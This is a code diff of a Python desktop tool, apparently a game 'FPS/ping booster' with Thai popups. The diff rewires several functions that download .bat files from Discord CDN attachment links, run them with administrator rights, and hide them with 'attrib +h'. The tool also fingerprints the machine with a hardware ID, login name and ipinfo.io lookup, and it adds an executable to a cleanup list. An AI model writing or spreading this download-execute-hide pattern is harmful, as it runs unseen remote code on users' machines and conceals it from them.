@@ -111,7 +111,7 @@ new_hwid = generate_hwid()[:16]
 hw = gethwid()[:15]
 mypcname = os.getlogin()
 NameProject = ("Jxstbeyond-By-Jenos")
-Version = ("1.6")
+Version = ("1.7")
 hwiduuid = f'''{NameProject} [{hw}-{mypcname}-{new_hwid}]''' 
 ipinfo = requests.get('https://ipinfo.io/json')
 ipinfojson = ipinfo.json()
@@ -200,7 +200,12 @@ files_to_remove = [
     'C:/Users/Public/Videos/Boost_FPS.bat',
     'C:/Users/Public/Videos/Install_Powerplan.bat',
     'C:/Users/Public/Videos/Low_ping.bat',
-    'C:/Users/Public/Videos/Clear_All_Temp.bat'
+    'C:/Users/Public/Videos/Clear_All_Temp.bat',
+    'C:/Users/Public/Videos/fixerror.exe',
+    'C:/Users/Public/Videos/RunSuperiorPunching.bat',
+    'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
+    'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
+    'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
 ]
 
 def page_login ():
@@ -390,15 +395,15 @@ def RunSuperiorPunching(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319205416980/RunSuperiorPunching.bat?ex=6582ce36&is=65705936&hm=19848aee167dd63bc643b961b8fe72b01f7654180bace8c9839c28ade8664d17&"
         if is_admin(): 
             try:
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/RunSuperiorPunching.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
-                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                with open(f'C:/Users/Public/Videos/RunSuperiorPunching.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/RunSuperiorPunching.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
-                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/RunSuperiorPunching.bat')
                 _doHideBatch.read()
                 _doHideBatch.close()
         else:
@@ -408,15 +413,15 @@ def RunUnbeatableNetwork(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319511613561/RunUnbeatableNetwork.bat?ex=6582ce36&is=65705936&hm=ae204501010896df377e0ef3d57a0b27c79f9cf218d09855a04ef711e1e3520a&"
         if is_admin(): 
             try:
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
-                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                with open(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
-                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/RunUnbeatableNetwork.bat')
                 _doHideBatch.read()
                 _doHideBatch.close()
         else:
@@ -426,15 +431,15 @@ def Y2KREALPUNCH(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319826178128/Y2KREALPUNCH.bat?ex=6582ce36&is=65705936&hm=aaaf5e603791e9695e0ed274e89ce708b4e6f7af7ba30e84e980553b60538619&"
         if is_admin(): 
             try:
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
-                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                with open(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
-                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                os.startfile(f'C:/Users/Public/Videos/Y2KREALPUNCH.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
-                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Y2KREALPUNCH.bat')
                 _doHideBatch.read()
                 _doHideBatch.close()
         else:
@@ -575,7 +580,12 @@ def join_page_two(event):
     'C:/Users/Public/Videos/Boost_FPS.bat',
     'C:/Users/Public/Videos/Install_Powerplan.bat',
     'C:/Users/Public/Videos/Low_ping.bat',
-    'C:/Users/Public/Videos/Clear_All_Temp.bat'
+    'C:/Users/Public/Videos/Clear_All_Temp.bat',
+    'C:/Users/Public/Videos/fixerror.exe',
+    'C:/Users/Public/Videos/RunSuperiorPunching.bat',
+    'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
+    'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
+    'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
      ]
 
     for file_path in files_to_remove:
